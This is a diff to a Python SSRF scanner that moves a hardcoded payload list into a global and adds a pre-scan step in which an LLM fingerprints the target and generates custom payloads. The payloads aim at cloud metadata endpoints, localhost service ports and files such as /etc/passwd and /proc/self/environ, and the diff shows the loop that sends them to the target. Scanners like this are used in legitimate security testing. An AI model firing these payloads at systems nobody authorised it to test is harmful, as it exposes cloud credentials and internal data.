@@ -50,6 +50,25 @@ API_KEY = args.api_key or os.environ.get('API_KEY')
 VULNERABLE_URLS = []
 print_lock = Lock()
 
+# If LLM fails to generate payload or not provided, we use these.
+CACHED_PAYLOADS = [
+		"http://127.0.0.1:80","http://metadata.google.internal/computeMetadata/v1/",
+"http://169.254.169.254/latest/meta-data/",
+"http://127.0.0.1",
+"http://127.0.0.1:8080",
+"http://127.0.0.1:8000",
+"http://127.0.0.1:9200",
+"http://127.0.0.1:6379",
+"http://127.0.0.1:22",
+"http://2130706433",
+"http://localtest.me",
+"http://[::1]",
+"file:///etc/passwd",
+"file:///etc/hosts",
+"file:///proc/self/environ",
+"file:///C:/Windows/win.ini"
+	]
+
 if args.provider:
     print(f"\033[94m[*] Configuring AI Provider: {args.provider} ({args.model})\033[0m")
     
@@ -264,39 +283,14 @@ def analyze_ssrf_result_with_llm(target_url, response_text):
     return None
 
 # --- AI PIVOT LOGIC ---
-def smart_pivot_to_internal(paramName, original_url, initial_response_text):
+def smart_pivot_to_internal(paramName, original_url):
     """
     Orchestrator: Generates payloads -> Executes -> Validates.
     """
-	
-    # 1. GENERATE
-    custom_payloads = ""
-    if args.provider and args.model:
-        custom_payloads = generate_payloads_with_llm(initial_response_text)
-    
-    if not custom_payloads:
-        print("[AI] LLM not provided OR failed to generate payloads. Falling back to hardcoded list.")
-        custom_payloads = [
-            "http://127.0.0.1:80","http://metadata.google.internal/computeMetadata/v1/",
-"http://169.254.169.254/latest/meta-data/",
-"http://127.0.0.1",
-"http://127.0.0.1:8080",
-"http://127.0.0.1:8000",
-"http://127.0.0.1:9200",
-"http://127.0.0.1:6379",
-"http://127.0.0.1:22",
-"http://2130706433",
-"http://localtest.me",
-"http://[::1]",
-"file:///etc/passwd",
-"file:///etc/hosts",
-"file:///proc/self/environ",
-"file:///C:/Windows/win.ini"
-        ]
-    else:
-        print(f"\033[92m[AI] Generated {len(custom_payloads)} context-aware payloads.\033[0m")
+    global CACHED_PAYLOADS
+    custom_payloads = CACHED_PAYLOADS
 
-    # 2. EXECUTE LOOP
+    # 1. EXECUTE LOOP
     regex = paramName + "=(.*?)(?:&|$)"
     match = re.search(regex, original_url)
     if not match: return
@@ -314,7 +308,7 @@ def smart_pivot_to_internal(paramName, original_url, initial_response_text):
             if r.status_code >= 400 and len(r.text) < 200:
                 continue
 
-            # 3. VALIDATE
+            # 2. VALIDATE
             result = analyze_ssrf_result_with_llm(payload, r.text)
             
             if result and result.get("status") == "VULNERABLE":
@@ -371,7 +365,7 @@ def check_non_blind_ssrf(paramName, original_url):
 			print(f"\033[91m    URL: {attack_url}\033[0m")
 			
 			# 4. PIVOT: Since we confirmed it can fetch external, let's try Internal!
-			smart_pivot_to_internal(paramName, original_url, response)
+			smart_pivot_to_internal(paramName, original_url)
 			return True
 			
 		else:
@@ -759,6 +753,25 @@ if args.threads:
 	num_threads = int(args.threads)
 else:
 	num_threads=10
+
+# Generating custom payloads with 
+if args.provider and args.model:
+    print(f"\033[94m[*] Probing {baseURL} to fingerprint tech stack...\033[0m")
+    if args.cookies:
+        res = requests.get(baseURL, verify=False, cookies=cookiesDict)
+    else:
+        res = requests.get(baseURL, verify=False)
+    try:
+        generated_payloads = generate_payloads_with_llm(res)
+        if generated_payloads:
+            CACHED_PAYLOADS = generated_payloads
+            print(f"\033[92m[+] AI Generated {len(CACHED_PAYLOADS)} custom payloads based on server headers.\033[0m")
+        else:
+            print(f"\033[92m[+] AI failed to generate payloads. Falling back to hardcoded list.")
+    except Exception as e:
+        print(f"\033[92m[+] AI failed to generate payloads. Falling back to hardcoded list.")
+else:
+    print(f"\033[92m[+] AI not provided. Falling back to hardcoded list.")
 
 #If burp input is provided we first parse it and map our results and then make another list out of it to pass to basic crawling to get maximum results
 if args.burp:
